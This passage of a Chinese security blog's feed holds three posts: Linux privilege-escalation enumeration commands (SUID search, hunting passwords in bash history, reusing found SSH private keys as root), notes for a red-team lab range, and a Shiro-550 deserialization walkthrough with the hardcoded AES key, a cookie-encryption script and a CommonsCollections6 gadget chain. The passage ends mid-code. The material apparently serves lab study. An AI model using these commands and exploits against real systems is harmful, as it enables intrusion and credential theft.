class="hljs-comment">#查看进程所对应的二进制文件及权限信息</span><br></code></pre></td></tr></table></figure><h1><span id="特权访问枚举">特权访问枚举</span></h1><p><strong>查看sudoers文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/sudoers <span class="hljs-comment">#该配置文件用于授权某些用户以超级权限执行特定的命令，默认情况该文件只有root能读取</span><br></code></pre></td></tr></table></figure><p><strong>查看是否可以无密码使用sudo</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> | sudo -S -l -k<br></code></pre></td></tr></table></figure><ul><li>-S表示从标准输入获取密码，也就是上面的空密码</li><li>-l 表示列出当前用户能用的权限</li><li>-k 表示重置时间戳，也就是下次再执行sudo时便需要输入密码</li></ul><h1><span id="cron任务枚举">cron任务枚举</span></h1><p><strong>查看所有cron任务</strong></p><p>列出&#x2F;etc&#x2F;下所有以cron开头的文件的详细信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -la /etc/cron* 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>这是一些可能的文件：</p><ul><li>&#x2F;etc&#x2F;crontab：该文件是cron的主配置文件，用来管理全局定时任务，即对整个系统有效的定时任务，包含任务的时间、命令以及执行此任务的用户。此配置任务还包含：SHELL字段，用来指定运行任务时使用的Shell路径信息；PATH字段，用来指定运行cron作业时使用的环境变量路径的值。</li><li>&#x2F;etc&#x2F;cron.d目录，该目录下也一般存放系统级别的定时任务</li><li>&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.monthly、&#x2F;etc&#x2F;cron.weekly目录下分别指定了每天、每小时、每个月、每周运行一次的脚本。</li></ul><p><strong>所有用户的定时任务</strong></p><p>列举所有用户的定时任务(需要root权限)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(getent passwd | <span class="hljs-built_in">cut</span> -f1 -d:); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;### Crontabs for <span class="hljs-variable">$user</span> ####&quot;</span>; crontab -u <span class="hljs-variable">$user</span> -l; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>查看当前用户的定时任务</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><strong>查看其他用户的定时任务</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l -u &lt;用户名&gt;<br></code></pre></td></tr></table></figure><h1><span id="软件信息枚举">软件信息枚举</span></h1><p><strong>CentOS查看已安装程序</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum list installed<br></code></pre></td></tr></table></figure><p><strong>Debian、Ubuntu查看已安装程序</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dpkg -l<br>apt list<br></code></pre></td></tr></table></figure><h1><span id="文件枚举">文件枚举</span></h1><p><strong>查看系统是否安装了文件传输、Shell反弹、代码编译等工具</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> nc 2&gt;/dev/null;<span class="hljs-built_in">which</span> netcat 2&gt;/dev/null;<span class="hljs-built_in">which</span> wget 2&gt;/dev/null;<span class="hljs-built_in">which</span> nmap 2&gt;/dev/null;<span class="hljs-built_in">which</span> gcc 2&gt;/dev/null;<span class="hljs-built_in">which</span> curl 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>查看系统敏感文件权限</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /etc/passwd 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/group 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/profile 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/shadow 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>查看特殊权限文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#查看SUID权限文件</span><br>find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#查看SGID权限文件</span><br></code></pre></td></tr></table></figure><p><strong>查看可写文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查找不属于当前用户但是当前用户可写的文件(排除/proc/和/sys/目录下的文件)</span><br>find / -writable ! -user `<span class="hljs-built_in">whoami</span>` -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-comment">#另一种方式</span><br>find / -perm -2 -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查看指定扩展名文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name *.bak -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查找关键字文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在当前目录及其子目录中查找扩展名为.php的文件，搜索并列出文件内容包含pass的行，并输出行号</span><br>find . -name <span class="hljs-string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="hljs-string">&quot;pass&quot;</span><br></code></pre></td></tr></table></figure><p><strong>查看历史命令记录文件</strong></p><p>查找可能存在的历史命令记录文件，如Bash历史记录文件、MySQL历史记录文件等等。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al ~/.*_history 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511103.png" alt="image-20240625211315620"></p><p>其中bash_history记录历史命令，我们可能从中获得一些服务的凭据之类的重要信息。</p><p><strong>查看隐藏文件</strong></p><p>比如有些管理员会将难记忆的密码通过隐藏文件的方式保存，我们可以通过bash历史命令文件进行搜索查看并获取一些敏感信息</p><p>这是一个示例查找命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-built_in">cat</span> ~/.bash_history | grep -i passw <span class="hljs-comment">#在历史命令搜索指定字符串</span><br></code></pre></td></tr></table></figure><p><strong>查看配置文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*.ovpn&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null <span class="hljs-comment">#.ovpn是虚拟专用网络的配置文件扩展名，即vpn</span><br></code></pre></td></tr></table></figure><p>查找之后我们就可以去看看里面的文件有什么信息</p><p><strong>查看SSH私钥文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name id_rsa 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>如果能找到的话，我们就可以将该文件复制到kali，然后执行下面命令以root用户登陆目标服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa <span class="hljs-comment">#设置权限</span><br>ssh -i id_rsa root@&lt;目标主机的ip&gt; <span class="hljs-comment">#使用id_rsa文件连接</span><br></code></pre></td></tr></table></figure><h1><span id="信息搜集辅助工具">信息搜集辅助工具</span></h1><p><strong>Metasploit模块</strong></p><p>在Metasoloit的post&#x2F;linux&#x2F;gather&#x2F;文件夹下有很多针对服务器信息搜集的后渗透模块。</p><p><strong>开源脚本搜集信息</strong></p><p>比如LinEnum，它可以获取服务器的各种信息，其实该脚本就是多条命令的集合，也可以自己写。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;服务器信息枚举&quot;&gt;服务器信息枚举&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;判断是否虚拟化&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;c</summary>
      
    
    
    
    <category term="Linux" scheme="https://clowsman.github.io/categories/Linux/"/>
    
    
    <category term="提权" scheme="https://clowsman.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场二</title>
    <link href="https://clowsman.github.io/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
    <id>https://clowsman.github.io/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/</id>
    <published>2024-06-22T09:29:33.000Z</published>
    <updated>2024-07-15T06:53:49.709Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="环境配置">环境配置</span></h1><p><strong>环境说明</strong></p><p>内网网段：10.10.10.1&#x2F;24</p><p>DMZ网段：192.168.111.1&#x2F;24</p><p>测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）</p><p>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deny all tcp ports：10.10.10.1<br>allow all tcp ports：10.10.10.0/24<br></code></pre></td></tr></table></figure><p><strong>配置信息</strong></p><p><strong>DC</strong></p><p>IP：10.10.10.10 OS：Windows 2012(64)</p><p>应用：AD域</p><p><strong>WEB</strong></p><p>IP1：10.10.10.80 IP2：192.168.111.80 OS：Windows 2008(64)</p><p>应用：Weblogic 10.3.6 MSSQL 2008</p><p><strong>PC</strong></p><p>IP1：10.10.10.201 IP2：192.168.111.201 OS：Windows 7(32)</p><p>应用：</p><p><strong>攻击机</strong></p><p>IP：192.168.111.1 OS：Windows 10(64)</p><p>IP：192.168.111.11 OS：Parrot(64)</p><p><img src="http://cdn.clown2024.cn/202407151453562.png" alt="image-20240622210728382"></p><p><img src="http://cdn.clown2024.cn/202407151453563.png" alt="image-20240622214931742"></p><h1><span id="考点描述">考点描述</span></h1><p>本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX</p><ol><li>Bypass UAC</li><li>Windows系统NTLM获取（理论知识：Windows认证）</li><li>Access Token利用（MSSQL利用）</li><li>WMI利用</li><li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li><li>域内信息收集</li><li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li><li>域凭证收集</li><li>后门技术（黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;环境配置&quot;&gt;环境配置&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;环境说明&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;内网网段：10.10.10.1&amp;#x2F;24&lt;/p&gt;
&lt;p&gt;DMZ网段：192.168.111.1&amp;#x2F;24&lt;/p&gt;
&lt;p&gt;测试机地址：</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化</title>
    <link href="https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-06-11T12:17:23.000Z</published>
    <updated>2024-08-17T07:50:27.297Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="shiro介绍">Shiro介绍</span></h1><p>直接问kimi给出的大致介绍</p><p>Apache Shiro是一个强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理等功能。它被设计为易于理解且易于使用，同时提供了强大的安全性。以下是Shiro的一些关键特性：</p><ol><li><strong>认证（Authentication）</strong>：Shiro提供了多种认证方式，包括用户名和密码、OAuth、LDAP等。</li><li><strong>授权（Authorization）</strong>：Shiro允许你定义权限和角色，并根据这些定义来控制用户对资源的访问。</li><li><strong>加密（Cryptography）</strong>：Shiro提供了一套加密工具，可以用于安全地存储和传输数据。</li><li><strong>会话管理（Session Management）</strong>：Shiro可以管理Web和非Web环境中的会话。</li><li><strong>Web支持</strong>：Shiro提供了对Web应用的内置支持，可以轻松集成到Servlet、JSP等Web技术中。</li><li><strong>缓存（Caching）</strong>：Shiro内置了缓存机制，可以提高认证和授权过程的性能。</li><li><strong>企业级安全</strong>：Shiro的设计考虑了企业级应用的需求，提供了灵活的安全策略和集成点。</li><li><strong>易于集成</strong>：Shiro可以轻松集成到现有的Java应用中，无论是大型企业应用还是小型项目。</li><li><strong>可扩展性</strong>：Shiro的架构允许开发者根据需要扩展其功能，例如自定义认证和授权策略。</li><li><strong>社区支持</strong>：作为Apache软件基金会的一部分，Shiro拥有活跃的社区和持续的更新。</li></ol><h1><span id="shrio环境搭建">Shrio环境搭建</span></h1><p>可以直接从github上面将代码clone到本地：<a href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p><p>然后切换回1.2.4的版本，该版本就是shiro550的漏洞</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:apache/shiro.git<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p><p><img src="http://cdn.clown2024.cn/202407151444228.png" alt="image-20240611233305207"></p><p>然后配置Tomcat服务器将环境跑起来即可，记得添加一个<strong>samples_web_war</strong>工件</p><p><img src="http://cdn.clown2024.cn/202407151444229.png" alt="image-20240611233723956"></p><p><img src="http://cdn.clown2024.cn/202407151444230.png" alt="image-20240611233734929"></p><p>环境搭建和漏洞分析都可以参考这篇文章：<a href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇） (changxia3.com)</a></p><p>怪了过两天这环境突然就出错了</p><p>emmm这里可能需要配置一下<strong>tomcat&#x2F;conf&#x2F;server.xml</strong>文件，不然会报错</p><p><img src="http://cdn.clown2024.cn/202407151444231.png" alt="image-20240613235256764"></p><p>参考这篇文章<a href="https://blog.csdn.net/seeeeeeeeeee/article/details/124724396">https://blog.csdn.net/seeeeeeeeeee/article/details/124724396</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Connector</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;8088&quot;</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">URIEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">connectionTimeout</span>=<span class="hljs-string">&quot;20000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">redirectPort</span>=<span class="hljs-string">&quot;8443&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">maxParameterCount</span>=<span class="hljs-string">&quot;1000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedPathChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedQueryChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               /&gt;</span><br></code></pre></td></tr></table></figure><p>说是新版tomcat请求不允许一些特殊字符，这里就放行一些特殊字符，但改了之后谷歌还是不行，edge改成http就可以了</p><p>后来找了半天找一个方法终于能解决了：<a href="https://blog.csdn.net/qq_69576997/article/details/136731424">https://blog.csdn.net/qq_69576997/article/details/136731424</a></p><p>谷歌浏览器url输入：chrome:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>edge浏览器url输入：edge:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>然后在最后一行的<strong>Delete domain security policies</strong>中输入localhost，点击delete，然后重启tomcat就可以了</p><p><img src="http://cdn.clown2024.cn/202407151444232.png" alt="image-20240614132940906"></p><p>麻了这些环境配置。。。</p><h1><span id="shiro550漏洞">Shiro550漏洞</span></h1><p>Shiro550的漏洞是因为其存在固定key加密的原因</p><h2><span id="寻找固定key">寻找固定key</span></h2><p>我们这里从源码入手找到其固定key</p><p>Shiro在登陆是勾选了rememberMe选项就会设置一个rememberMe的cookie</p><p><img src="http://cdn.clown2024.cn/202407151444233.png" alt="image-20240611234659707"></p><p><img src="http://cdn.clown2024.cn/202407151444234.png" alt="image-20240611234718498"></p><p>且解码的流程就是<strong>base64解码&#x3D;》AES解密&#x3D;》反序列化</strong></p><p>我们可以直接去源码搜索对应的函数，可以全局搜索一下Cookie关键字</p><p>可以找到一个CookieRememberMeManger函数，这名字就很明显了</p><p><img src="http://cdn.clown2024.cn/202407151444235.png" alt="image-20240612000131474"></p><p>然后里面有对cookie处理的很多函数，我们可以找到一个序列化和反序列化之类相关的方法，这里先找一个反序列化相关的函数，然后往上寻找调用链，找到他的固定key</p><p><img src="http://cdn.clown2024.cn/202407151444236.png" alt="image-20240613221027529"></p><p>这里就是获取序列化内容反序列化，然后base64解码，返回的对应AES加密的内容</p><p>往上找调用方法</p><p><img src="http://cdn.clown2024.cn/202407151444237.png" alt="image-20240613221343146"></p><p>这里进行了convert转换了一下，这里函数再往上找已经是一些校验相关的功能了，那就是这个函数已经完成了解密，跟进去函数看看</p><p><img src="http://cdn.clown2024.cn/202407151444238.png" alt="image-20240613221819479"></p><p>果然，里面进行了解密，然后再进行反序列化之后返回</p><p>从其中的函数功能最终跟踪下去可以在<strong>AbstractRememberMeManager</strong>这个类的构造方法找到固定key的赋值</p><p><img src="http://cdn.clown2024.cn/202407151444239.png" alt="image-20240612001639914"></p><p><img src="http://cdn.clown2024.cn/202407151444240.png" alt="image-20240612001655002"></p><p>可以知道其密钥是固定字符串的base64解码得到</p><p>知道了固定密钥之后构造对应的rememberMe字符串就很简单了，AES加密的脚本可以网上找一下</p><h2><span id="打cc链">打cc链</span></h2><p>一般shiro都会有cc的包</p><p><img src="http://cdn.clown2024.cn/202407151444241.png" alt="image-20240612001947670"></p><p>但是不一定可以打，我们可以用插件分析一下依赖关系</p><p><img src="http://cdn.clown2024.cn/202407151444242.png" alt="image-20240612002101256"></p><p>被标了test的运行时都不会被编译，所以一般线上的时候都是打不通的，不过这里的原因是没有代码去使用这个依赖，没有import它。</p><p><strong>这里原生shiro没有自带cc依赖</strong></p><p>这里加一个3.2.1的版本</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>AES加密的脚本</strong></p><p>网上找的一个脚本：<a href="https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki=sF54D&alichlgref=https://www.google.com/#toc-1">https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki%3DsF54D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s:s +((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64encode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s : s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><blockquote><p>这个Crypto库有点坑，第一次用，记录一下</p><p>先安装下面这个库</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pip3 install pycryptodome<br></code></pre></td></tr></table></figure><p>然后需要去c:\users\86189\appdata\local\programs\python\python37\lib\site-packages路径下将一个crypto的文件夹的c改成大写的C即可</p></blockquote><p><strong>固定密钥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">kPH+bIxk5D2deZiIxcaaaA==<br></code></pre></td></tr></table></figure><p>我们可以先打一个cc6的链子试一试</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6_demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//这里待会调用的时候会在mpa新增加一个键值对aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>        